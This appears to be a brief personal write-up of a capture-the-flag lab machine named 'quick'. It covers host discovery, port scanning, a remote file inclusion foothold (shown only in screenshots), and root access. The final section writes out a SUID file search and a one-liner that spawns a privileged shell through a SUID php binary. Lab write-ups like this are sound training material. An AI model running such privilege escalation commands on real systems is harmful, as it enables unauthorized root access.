---
title: quick
tags:
  - sec
date: 2024-02-10T22:09:01
lastmod: 2025-09-29T20:51:52
toc: "true"
draft: "false"
---
## host discovery
主机发现, 重置了 wsl 的环境之后, 发现能够使用 arp-scan 了
![HMM_quick_image_1](https://img.l1uyun.one/HMM_quick_image_1.png)
前后对比
![HMM_quick_image_2](https://img.l1uyun.one/HMM_quick_image_2.png)
```bash
192.168.10.12
```
## port scan
只有一个 80 端口
![HMM_quick_image_3](https://img.l1uyun.one/HMM_quick_image_3.png)

服务版本, 默认脚本, 操作系统扫描
![HMM_quick_image_4](https://img.l1uyun.one/HMM_quick_image_4.png)
漏洞扫描
![HMM_quick_image_5](https://img.l1uyun.one/HMM_quick_image_5.png)

## 利用远程包含获得 shell 
RFI
![HMM_quick_image_6](https://img.l1uyun.one/HMM_quick_image_6.png)
![HMM_quick_image_7](https://img.l1uyun.one/HMM_quick_image_7.png)
## user. txt PWD
![HMM_quick_image_8](https://img.l1uyun.one/HMM_quick_image_8.png)
![HMM_quick_image_9](https://img.l1uyun.one/HMM_quick_image_9.png)
## use SUID file to get root
 `find / -type f -perm -u=s 2>/dev/null`
发现一个suid的 php
```bash
./usr/bin/php7.0 -r "pcntl_exec('/bin/sh', ['-p']);"
```
## root. txt PWD

![HMM_quick_image_10](https://img.l1uyun.one/HMM_quick_image_10.png)